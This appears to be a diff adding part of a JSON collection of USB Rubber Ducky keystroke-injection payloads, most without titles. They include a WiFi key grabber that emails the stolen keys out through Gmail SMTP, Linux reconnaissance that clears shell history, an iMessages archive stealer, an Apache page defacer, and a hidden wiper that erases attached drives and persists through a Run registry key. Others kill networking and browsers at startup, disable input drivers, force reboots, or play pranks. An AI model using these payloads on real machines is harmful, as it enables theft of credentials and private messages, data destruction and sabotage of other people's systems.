&#39;smtp.gmail.com&#39;\nENTER\nSTRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\nENTER\nSTRING $SMTPInfo.EnableSsl = $true\nENTER\nSTRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential(&#39;ACCOUNT@gmail.com&#39;, &#39;PASSWORD&#39;)\nENTER\nSTRING $ReportEmail = New-Object System.Net.Mail.MailMessage\nENTER\nSTRING $ReportEmail.From = &#39;ACCOUNT@gmail.com&#39;\nENTER\nSTRING $ReportEmail.To.Add(&#39;RECEIVER@gmail.com&#39;)\nENTER\nSTRING $ReportEmail.Subject = &#39;WiFi key grabber&#39;\nENTER\nSTRING $ReportEmail.Body = (Get-Content Log.txt | out-string)\nENTER\nSTRING $SMTPInfo.Send($ReportEmail)\nENTER\nSTRING exit\nENTER\nREM --&gt; Delete Log.txt and exit\nSTRING del Log.txt &amp; exit\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 74,
+    "Description": null,
+    "Code": "REM Info gathering Ubuntu 1.0 Script issues OS info gathering commands in terminal - by Captain_Harlock, Improved by Thecakeisgit ;D\nDELAY 3000\nCTRL ALT t\nDELAY 1500\nSTRING clear\nDELAY 10\nENTER\nDELAY 50\nSTRING echo &#34;Logged in user: &#34; $USER &gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 50\nSTRING echo -n &#34;Distribution Kernel Version: &#34; &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 50\nSTRING cat /etc/issue | cut -c1-13 &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 50\nSTRING echo -n &#34;uname results: &#34; &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 50\nSTRING uname -a &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 100\nSTRING echo &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 50\nSTRING echo &#34;Shellsock Bug Vulnerability: &#34; &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 50\nSTRING env x=&#39;() { :;}; echo vulnerable&#39; bash -c &#34;echo this is a test&#34; &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 50\nSTRING echo &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 50\nSTRING echo &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 50\nSTRING echo &#34;Mounted filesystems: &#34; &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING mount -l &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 100\nSTRING echo &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &#34;Network Configuration: &#34; &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 50\nSTRING ifconfig -a | grep &#39;Link\\|inet&#39; &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &#34;Print Hosts: &#34; &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING cat /etc/hosts &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &#34;Print ARP: &#34; &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING arp &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &#34;Development tools availability: &#34; &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING which gcc &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING which g++ &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING which python &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &#34;Print TCP/UDP Listening Services: &#34; &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING netstat -tunlpe &gt;&gt; info_gathering.txt\nENTER\nDELAY 300\nSTRING echo &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &#34;Installed Packages: &#34; &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 200\nSTRING dpkg -l &gt;&gt; info_gathering.txt\nENTER\nDELAY 300\nSTRING echo &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &#34;Find Readable Folders in /etc: &#34; &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING find /etc -user $(id -u) -perm -u=r -o -group $(id -g) -perm -g=r -o -perm -o=r -ls 2&gt; /dev/null &gt;&gt; info_gathering.txt\nENTER\nDELAY 500\nSTRING echo &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING echo &#34;Find SUID and GUID files&#34; &gt;&gt; info_gathering.txt\nENTER\nDELAY 50\nSTRING find / -type f -perm -u=s -o -type f -perm -g=s -ls  2&gt; /dev/null &gt;&gt; info_gathering.txt\nDELAY 50\nENTER\nDELAY 15000\nSTRING history -c\nDELAY 50\nENTER\nDELAY 50\nSTRING exit\nDELAY 50\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 75,
+    "Description": null,
+    "Code": "DELAY 1000\nGUI SPACE\nDELAY 100\nSTRING terminal\nDELAY 100\nENTER\nDELAY 1000\nSTRING ifconfig\nENTER\nDELAY 250\nGUI A\nDELAY 100\nGUI C\nDELAY 100\nGUI Q\nDELAY 100\nGUI SPACE\nDELAY 100\nSTRING textedit\nDELAY 100\nENTER\nDELAY 1000\nGUI A\nDELAY 100\nGUI V\nDELAY 100\nGUI Q\nDELAY 500\nSTRING default_config\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 76,
+    "Description": null,
+    "Code": "REM This script captures iMessages and puts it into\nREM a folder named automatically to the victims username\nDELAY 500\nGUI SPACE\nDELAY 150\nSTRING Terminal\nENTER\nDELAY 300\nSTRING cp -r ~/Library/Messages/Archive /Volumes/RubberDucky/$USER/\nENTER\nSTRING history -c\nENTER\nSTRING diskutil umount /Volumes/RubberDucky\nENTER\nDELAY 500\nSTRING history -c\nENTER\nSTRING echo 5A13X99\nENTER\nDELAY 1000\nSTRING exit\nENTER\nDELAY 250\nGUI q\n"
+  },
+  {
+    "Title": null,
+    "Id": 77,
+    "Description": null,
+    "Code": "REM Auto Defacer for Ubuntu Based Machines running Apache.\nREM Description: Automatically defaces index page of an apache web server.\nDEFAULT_DELAY 200\nALT F2\nSTRING terminal\nENTER\nSTRING cd /var/www\nENTER\nSTRING mv index.* index.bak\nENTER\nSTRING touch index.html\nENTER\nSTRING nano index.html\nENTER\nSTRING &lt;marquee&gt;You have been hacked by the USB Rubber Ducky!&lt;/marquee&gt;\nENTER\nSTRING &lt;center&gt;&lt;a href=&#34;http://www.usbrubberducky.com/&#34;&gt;&lt;img src=&#34;http://cdn.shopify.com/s/files/1/0068/2142/products/usbducky2.jpg&#34; /&gt;&lt;/a&gt;&lt;center&gt;\nENTER\nSTRING &lt;center&gt;&lt;h5&gt;Your old index page can be found &lt;a href=&#34;./index.bak&#34;&gt;here.&lt;/a&gt;&lt;/h5&gt;&lt;/center&gt;\nCONTROL x\nSTRING y\nENTER\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 78,
+    "Description": null,
+    "Code": "REM PURPOSE: to delete the contents of attached drives.\nGUI r\nSTRING cmd /Q /D /T:7F /F:OFF /V:OFF /K\nDELAY 500\nENTER\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\nREM THE DIRECTORY YOU WANT TO HIDE THE SCRIPT IN\nSTRING cd %TEMP%\nENTER\nREM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.\nREM Delete vbs file if already exists\nSTRING erase /Q invis.vbs\nENTER\nREM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up\nSTRING copy con invis.vbs\nENTER\nSTRING CreateObject(&#34;Wscript.Shell&#34;).Run &#34;&#34;&#34;&#34; &amp; WScript.Arguments(0) &amp; &#34;&#34;&#34;&#34;, 0, False\nENTER\nCONTROL z\nENTER\nREM Delete batch file if already exists\nSTRING erase /Q SecurityBullseye.bat\nENTER\nREM Make the batch file\nREM SLIGHT THROWBACK TO VIDEO GAME BIOSHOCK I/II\nSTRING copy con SecurityBullseye.bat\nENTER\nREM REGISTRY KEY RESTARTS THE SCRIPT ON REBOOT\nSTRING REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Persistence /t REG_SZ /d &#34;wscript.exe %TEMP%\\invis.vbs %TEMP%\\SecurityBullseye.bat&#34; /f\nENTER\nSTRING :while1\nENTER\nREM C:\\ IS USUALLY THE DRIVE THE OS IS INSTALLED ON, SO OMIT.\nSTRING for %%a in (A B D E F G H I J K L M N O P Q R S T U V W X Y Z) do (\nENTER\nSTRING IF EXIST %%a:\\ erase /Q /S /F &#34;%%a:\\*.*&#34;\nENTER\nSTRING IF EXIST %%a:\\ rmdir /Q /S &#34;%%a:\\*&#34;\nENTER\nSTRING )\nENTER\nSTRING timeout /t 60\nENTER\nSTRING goto :while1\nENTER\nCONTROL z\nENTER\nREM RUN THE BATCH FILE\nSTRING wscript.exe invis.vbs SecurityBullseye.bat\nENTER\nSTRING EXIT\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 79,
+    "Description": null,
+    "Code": "REM A new DenyNetAccess program that employs window hiding techniques.\nCONTROL ESCAPE\nSTRING cmd /Q /D /T:7F /F:OFF /V:OFF /K\nDELAY 500\nENTER\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\nREM A Different directory in case the second one is inaccessable\nDELAY 750\nSTRING cd %userprofile%\\Downloads\\\nENTER\nSTRING cd C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\nENTER\nREM Delete batch file if already exists\nSTRING erase /Q a.bat\nENTER\nREM Make the batch file\nSTRING copy con a.bat\nENTER\nSTRING @echo off\nENTER\nSTRING :Start\nENTER\nREM Release Networking INformation\nSTRING ipconfig /release\nENTER\nREM 2 Generic Browsers\nSTRING taskkill /f /im &#34;iexplore.exe&#34;\nENTER\nSTRING taskkill /f /im &#34;firefox.exe&#34;\nENTER\nREM Microsoft Visual Studio 2010\nSTRING taskkill /f /im &#34;devenv.exe&#34;\nENTER\nSTRING timeout /t 60\nENTER\nSTRING Goto Start\nENTER\nCONTROL z\nENTER\nREM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.\nREM Delete vbs file if already exists\nSTRING erase /Q invis.vbs\nENTER\nREM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up\nSTRING copy con invis.vbs\nENTER\nSTRING CreateObject(&#34;Wscript.Shell&#34;).Run &#34;&#34;&#34;&#34; &amp; WScript.Arguments(0) &amp; &#34;&#34;&#34;&#34;, 0, False\nENTER\nCONTROL z\nENTER\nREM RUN THE BATCH FILE\nSTRING wscript.exe invis.vbs a.bat\nENTER\nREM Close the cmd prompt.\nSTRING EXIT\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 80,
+    "Description": null,
+    "Code": "REM Title: Website Lock\nREM Author: Audiack\nREM Target Ducky Encoder: 2.6.2\nREM Target OS: Windows 7 (32 and 64 bit), maybe older/newer windows versions. Haven&#39;t tested it on any other than 7.\nREM Description: Plays off of Aprizm&#39;s script to open a website, but it also disables the mouse and keyboard so the user can&#39;t leave the website.\nREM Info:\nREM     The user can easily unplug and re-plug in the keyboard/mouse to reinstall the drivers get them working again.\nREM     This requires the user to plug a USB drive in BEFORE the ducky is plugged in.\nREM     The files are here: https://www.dropbox.com/sh/i09leu4kcifta6a/AACEFYQnlOIUsDtLLrQuemCha?dl=0.\nREM     Make sure the files are in the root of a drive called DUCKY.\nREM     Twin duck works well with this. It is what I used when I was testing it.\nREM File Descriptions:\nREM     The devcon32 &amp; devcon64 are the files used to uninstall the keyboard and mouse drivers (for the two architectures).\nREM     The invisible.vbs is used to run the batch script invisibly after the video is in fullscreen.\nREM     The TheRealAnnoyance.bat is the batch script run in the background that disables their mouse &amp; keyboard.\nREM     The WebsiteLink.txt contains the website link. The user can change this as desired. Make sure there are no spaces and there is only a single link.\nREM     If you are going to modify the website link as a youtube video, it needs to be in this format: https://www.youtube.com/embed/sCNrK-n68CM?rel=0&amp;autoplay=1&amp;loop=1\nREM     Find the youtube video you want, then take the part after watch?v= and put it in place of sCNrK-n68CM in the above link.\nDELAY 3000\nCTRL ESC\nDELAY 700\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 3000\nALT Y\nDELAY 700\n\nSTRING for /f %d in (&#39;wmic.exe volume get driveletter^, label ^| findstr &#34;DUCKY&#34;&#39;) do set myd=%d\nENTER\nDELAY 1200\nSTRING cd /d %myd%\nENTER\n\nDELAY 1000\nSTRING type &#34;WebsiteLink.txt&#34; | clip\nENTER\nDELAY 100\nSTRING C:/windows/System32/wscript.exe invisible.vbs TheRealAnnoyance.bat\nENTER\nDELAY 400\n"
+  },
+  {
+    "Title": null,
+    "Id": 81,
+    "Description": null,
+    "Code": "REM Aprizm&#39;s code for youtube roller begins here. I changed the link to a ctrl-v so that the ducky pastes the contents of WebsiteLink.txt hence the above line of code: &#39;type &#34;WebsiteLink.txt&#34; | clip&#39;\nREM Title: Youtube Roller\nREM Author: Aprizm\nREM Description: This scripts opens a youtube video in fullscreen and puts the browser in fullscreen\nREM Option : if you change the link of the video dont forget to change the watch with watch_popup to have it fullscreen also add &amp;loop=1 at the end to make it loop forever\nDELAY 200\nGUI r\nDELAY 200\nCTRL V\nENTER\nDELAY 1000\nF11\n"
+  },
+  {
+    "Title": null,
+    "Id": 82,
+    "Description": null,
+    "Code": "REM payload creats a vbs script that is run to make a YouveBeenUglyRolled.lnk to IE in the users start-up folder\nREM IE is set to run in kiosk mode &#34;-K&#34; and links to youtube with a very annoying lady gaga with jim carrey&#39;s face video\nREM note if running in 64 bit windows, you may need to change %programfiles% with %programfiles(x86)% flash player 64 bit may not be installed!\nESCAPE\nGUI r\nDELAY 120\nSTRING cmd.exe\nENTER\nDELAY 325\nSTRING copy con YouveBeenUglyRolled.vbs\nENTER\nSTRING Set WshShell = WScript.CreateObject(&#34;WScript.Shell&#34;):\nSTRING StrMyStartUp = WshShell.SpecialFolders(&#34;Startup&#34;):\nSTRING Set lnk = WshShell.CreateShortcut(StrMyStartUp + &#34;\\YouveBeenUglyRolled.lnk&#34;):\nENTER\nSTRING lnk.TargetPath = &#34;%programfiles%\\Internet Explorer\\iexplore.exe&#34;:\nREM place any link here, this one is a very annoying lady gaga with jim carrey&#39;s face\nREM the -K option makes IE run in kiosk mode\nSTRING lnk.Arguments = &#34;-K http://www.youtube.com/v/XYYo3T6nCw8?autoplay=1&#34;:\nREM also try http://www.youtube.com/v/9WZGyzz5O-U?autoplay=1 for katy perry rip, or\nREM http://www.youtube.com/v/HqGsT6VM8Vg?autoplay=1 for scary car video\nSTRING lnk.Save\nENTER\nCTRL z\nENTER\nSTRING YouveBeenUglyRolled.vbs\nENTER\nDELAY 200\nSTRING DEL YouveBeenUglyRolled.vbs\nENTER\nSTRING EXIT\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 83,
+    "Description": null,
+    "Code": "GUI d\nDELAY 500\nPRINTSCREEN\nDELAY 100\nMENU\nDELAY 300\nSTRING V\nDELAY 40\nSTRING D\nDELAY 300\nGUI r\nDELAY 700\nSTRING mspaint\nENTER\nDELAY 1200\nCTRL v\nDELAY 500\nCTRL s\nDELAY 1000\nSTRING %userprofile%\\a.bmp\nENTER\nDELAY 500\nALT f\nDELAY 400\nSTRING K\nDELAY 100\nSTRING F\nDELAY 1000\nALT F4\nDELAY 300\nGUI d\n"
+  },
+  {
+    "Title": null,
+    "Id": 84,
+    "Description": null,
+    "Code": "DELAY 10000\nGUI d\nDELAY 100\nPRINTSCREEN\nDELAY 100\nMENU\nDELAY 70\nSTRING h\nDELAY 50\nSTRING b\nDELAY 50\nGUI r\nDELAY 200\nSTRING mspaint\nENTER\nDELAY 500\nCTRL v\nDELAY 300\nALT f\nDELAY 300\nSTRING b\nDELAY 300\nENTER\nDELAY 300\nSTRING a1z2.png\nENTER\nALT F4\nDELAY 300\nGUI d\n"
+  },
+  {
+    "Title": null,
+    "Id": 85,
+    "Description": null,
+    "Code": "CONTROL ESCAPE\nDELAY 200\nSTRING mspaint\nENTER\nDELAY 1000\nCTRL e\nSTRING 6\nTAB\nSTRING 1\nENTER\nCTRL PAGEUP\nREPEAT 5\nREM ****FIRST COLOR****\nALT h\nSTRING EC\nALT r\nSTRING 10\nTAB\nSTRING 0\nTAB\nSTRING 0\nENTER\nREM ****SECOND COLOR****\nALT h\nSTRING EC\nALT r\nSTRING 13\nTAB\nSTRING 10\nTAB\nSTRING 13\nENTER\nREM ****THIRD COLOR****\nALT h\nSTRING EC\nALT r\nSTRING 100\nTAB\nSTRING 109\nTAB\nSTRING 99\nENTER\nREM ****FOURTH COLOR****\nALT h\nSTRING EC\nALT r\nSTRING 120\nTAB\nSTRING 101\nTAB\nSTRING 46\nENTER\nREM ****FIFTH COLOR****\nALT h\nSTRING EC\nALT r\nSTRING 0\nTAB\nSTRING 0\nTAB\nSTRING 101\nENTER\nREM ****SIXTH COLOR****\nALT h\nSTRING EC\nALT r\nSTRING 0\nTAB\nSTRING 0\nTAB\nSTRING 0\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 86,
+    "Description": null,
+    "Code": "GUI d\nWINDOWS\nSTRING https://i.imgflip.com/1dv8ac.jpg\nENTER\nDELAY 100\nREM Opens up window and goes to a image I created xD\nCTRL s\nSTRING %userprofile%\\Desktop\\QUACKED\nENTER\nREM saving the picture to the user Desktop, pic name QUACKED...\nDELAY 100\nGUI d\nREM shows desktop\nWINDOWS r\nSTRING %userprofile%\\Desktop\\QUACKED.png\nENTER\nREM opens the png file\nMENU\nENTER\nALT F4\nREM sets the background, and closes.\nGUI d\nMENU\nSTRING v\nSTRING d\n"
+  },
+  {
+    "Title": null,
+    "Id": 87,
+    "Description": null,
+    "Code": "REM Open the command line. You don&#39;t need admin because you are only adding to the Users Startup Directory\nESCAPE\nCONTROL ESCAPE\nDELAY 400\nSTRING cmd\nENTER\nDELAY 100\nREM start making Shutdown.bat\nSTRING copy con &#34;%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Shutdown.bat&#34;\nSTRING @echo off\nENTER\nSTRING shutdown /r /t 30\nREM The shutdown command has many good options &#39;/t&#39; adds a Delay, and &#39;/r&#39; restarts\nREM &#39;/s&#39; will shut the computer down and &#39;/l&#39; (L) is to just logoff the user more options are available by running &#39;shutdown /?&#39;\nENTER\nCTRL z\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 88,
+    "Description": null,
+    "Code": "CONTROL ESCAPE\nDELAY 50\nSTRING Screen Resolution\nDELAY 50\nENTER\nDELAY 100\nTAB\nTAB\nTAB\nDOWN\nDOWN\nTAB\nTAB\nTAB\nTAB\nTAB\nENTER\nTAB\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 89,
+    "Description": null,
+    "Code": "DELAY 500\nGUI\nDELAY 150\nTAB\nDELAY 150\nTAB\nDELAY 150\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 90,
+    "Description": null,
+    "Code": "REM This payload will open terminal, crank up the Macs volume all the way, then open a youtube video of\nREM your choice by replacing the link.\nDELAY 1000\nGUI SPACE\nSTRING terminal\nDELAY 500\nENTER\nDELAY 4000\nSTRING osascript -e &#39;set volume 7&#39;\nDELAY 500\nENTER\nDELAY 500\nSTRING open https://www.youtube.com/watch?v=dQw4w9WgXcQ\nDELAY 500\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 91,
+    "Description": null,
+    "Code": "REM Description: This payload opens a photo booth window and automatically takes a picture. Once this picture is taken, this payload proceeds to open terminal and tell it to say &#34;You look ugly!&#34;. This payload is great for friends and family.\nREM --------------------------------\nDELAY 1000\nGUI SPACE\nDELAY 100\nSTRING photo booth\nDELAY 100\nENTER\nDELAY 1000\nENTER\nDELAY 3000\nGUI SPACE\nDELAY 100\nSTRING terminal\nDELAY 100\nENTER\nDELAY 1000\nSTRING say You look ugly!\nDELAY 100\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 92,
+    "Description": null,
+    "Code": null
+  }
+]
